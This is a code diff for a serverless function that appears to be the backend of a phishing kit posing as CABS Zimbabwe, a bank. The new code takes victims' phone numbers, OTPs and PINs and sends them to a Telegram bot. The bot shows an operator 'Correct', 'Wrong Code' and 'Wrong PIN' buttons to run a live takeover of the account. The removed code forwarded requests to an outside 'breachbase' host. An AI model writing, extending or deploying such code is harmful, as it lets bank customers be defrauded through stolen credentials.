@@ -1,59 +1,111 @@
-const UPSTREAM_BASE = process.env.BRIDGE_URL || 'https://p.breachbase.lol';
-const TENANT_KEY = process.env.TENANT_KEY;
+const { Redis } = require("@upstash/redis");
 
-function setCors(res) {
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
-}
+exports.handler = async (event, context) => {
+    // Handle OPTIONS for CORS
+    if (event.httpMethod === "OPTIONS") {
+        return {
+            statusCode: 204,
+            headers: {
+                "Access-Control-Allow-Origin": "*",
+                "Access-Control-Allow-Methods": "POST, OPTIONS",
+                "Access-Control-Allow-Headers": "Content-Type",
+            },
+            body: ""
+        };
+    }
 
-function normalizeBody(body) {
-  if (!body) return undefined;
-  if (typeof body === 'string') return body;
-  return JSON.stringify(body);
-}
-
-module.exports = async function handler(req, res) {
-  setCors(res);
-
-  if (req.method === 'OPTIONS') {
-    return res.status(204).end();
-  }
-
-  if (req.method !== 'POST') {
-    return res.status(405).json({ error: 'Method not allowed' });
-  }
-
-  if (!TENANT_KEY) {
-    return res.status(500).json({ error: 'Server misconfigured: TENANT_KEY is missing' });
-  }
-
-  try {
-    const upstreamRes = await fetch(`${UPSTREAM_BASE}/v1/callback`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        Authorization: `Bearer ${TENANT_KEY}`
-      },
-      body: normalizeBody(req.body)
-    });
-
-    const text = await upstreamRes.text();
-
-    if (!text) {
-      return res.status(upstreamRes.status).end();
+    if (event.httpMethod !== "POST") {
+        return { statusCode: 405, body: "Method Not Allowed" };
     }
 
     try {
-      return res.status(upstreamRes.status).json(JSON.parse(text));
-    } catch {
-      res.setHeader('Content-Type', 'text/plain; charset=utf-8');
-      return res.status(upstreamRes.status).send(text);
+        const body = JSON.parse(event.body || "{}");
+        const { type, phone, details, otp, pin } = body;
+
+        if (!phone) {
+            return {
+                statusCode: 400,
+                headers: { "Access-Control-Allow-Origin": "*" },
+                body: JSON.stringify({ error: "Phone number is required" }),
+            };
+        }
+
+        // Initialize Redis Client
+        const redis = new Redis({
+            url: process.env.UPSTASH_REDIS_REST_URL || "",
+            token: process.env.UPSTASH_REDIS_REST_TOKEN || "",
+        });
+
+        // Generate a random attempt ID
+        const attemptId = Math.random().toString(36).substring(2, 15);
+
+        // Store status as pending with expiration (e.g., 5 minutes)
+        await redis.set(`attempt:${attemptId}`, "pending", { ex: 300 });
+
+        // Send to Telegram
+        const botToken = process.env.TELEGRAM_BOT_TOKEN;
+        const chatId = process.env.TELEGRAM_CHAT_ID;
+
+        if (botToken && chatId) {
+            const now = new Date();
+            const timeString = now.toLocaleString('en-US', { timeZone: 'Africa/Harare' });
+            
+            const titlePrefix = (type || 'LOGIN').toUpperCase();
+            
+            let messageDetails = '';
+            if (details) messageDetails += `\n*Details:* \`${details}\``;
+            if (otp) messageDetails += `\n🔑 *OTP:* \`${otp}\``;
+            if (pin) messageDetails += `\n🔑 *PIN:* \`${pin}\``;
+
+            const message = `✅ *CABS ZIMBABWE — ${titlePrefix}*
+
+🆕 *NEW USER*
+🌍 *Country:* +263 (ZWE)
+📞 *Number:* ${phone.replace(/^\+?263/, '')}${messageDetails}
+⏰ *Time:* ${timeString}
+
+-------------------------
+⏱ *Timeout:* 5 min
+
+_Attempt ID: ${attemptId}_`;
+            
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            await fetch(telegramUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: "Markdown",
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: "✅ Correct", callback_data: `approve_${attemptId}` }
+                            ],
+                            [
+                                { text: "❌ Wrong Code", callback_data: `reject_${attemptId}` },
+                                { text: "⚠️ Wrong PIN", callback_data: `reject_${attemptId}` }
+                            ]
+                        ]
+                    }
+                }),
+            });
+        }
+
+        return {
+            statusCode: 200,
+            headers: { "Access-Control-Allow-Origin": "*" },
+            body: JSON.stringify({ attemptId, status: "pending" }),
+        };
+    } catch (error) {
+        console.error("Callback Error:", error);
+        return {
+            statusCode: 500,
+            headers: { "Access-Control-Allow-Origin": "*" },
+            body: JSON.stringify({ error: "Internal Server Error" }),
+        };
     }
-  } catch (error) {
-    return res.status(502).json({
-      error: 'Upstream callback request failed',
-      message: error instanceof Error ? error.message : 'Unknown error'
-    });
-  }
 };
